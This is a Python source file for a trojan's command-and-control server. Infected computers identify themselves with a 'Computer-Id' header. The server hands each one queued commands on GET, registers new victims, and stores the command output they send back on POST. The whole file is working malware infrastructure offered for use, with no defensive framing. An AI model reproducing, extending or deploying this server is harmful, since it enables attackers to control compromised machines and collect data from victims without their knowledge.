from http.server import HTTPServer, BaseHTTPRequestHandler

class HTTPRequestHandler(BaseHTTPRequestHandler):
    def _set_headers(self, code : int):
        self.send_response(code)
        self.end_headers()

    def headers_to_dict(self) -> dict:
        headers = str(self.headers)
        headerdict = {}
        for line in headers.split('\n')[:-1]: #last one is an empty line
            if line.startswith(('GET', 'POST')): #info need to ignore
                continue
            point_index = line.find(': ') #find point where key seperates from value
            headerdict[line[:point_index].strip()] = line[point_index+1:].strip() #creates it in dictionary
        return headerdict
            
    def do_GET(self):
        headers = self.headers_to_dict()
        try: #checks if got computerID in header
            self._set_headers(200) #set headers- valid request
            computer = headers['Computer-Id'] #gets id sent in header
            try:
                with open(f'{computer.lower()}.txt', 'r') as file:
                    html = file.read() #get encrypted html commands
                self.wfile.write(html.encode('utf8')) #send commands
                print(f'[*] -> commands sent to computer {computer}')
            except FileNotFoundError: #trojan not set up on network
                file = open(f'{computer.lower()}.txt', 'w') #creates file
                file.close()
                self.wfile.write(bytes('setup complete', 'utf8'))
                print(f'[+] New trojan running on computer {computer}')
        except Exception as e: #no computerID
            self._set_headers(403) #set headers- valid but unauthorised to carry 
            
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        headers = self.headers_to_dict()
        try:
            self._set_headers(200)
            computer = headers['Computer-Id'] #gets id sent in header
            print(f'[*] <- recieved command output from computer {computer}')
            with open(f'{computer.lower()}.txt', 'w') as file:
                file.write(post_data.decode())
        except Exception as e:
            self._set_headers(403)
        
            
            
        
if __name__ == '__main__':
    import sys
    with HTTPServer((sys.argv[1], int(sys.argv[2])), HTTPRequestHandler) as httpd:
        httpd.serve_forever()
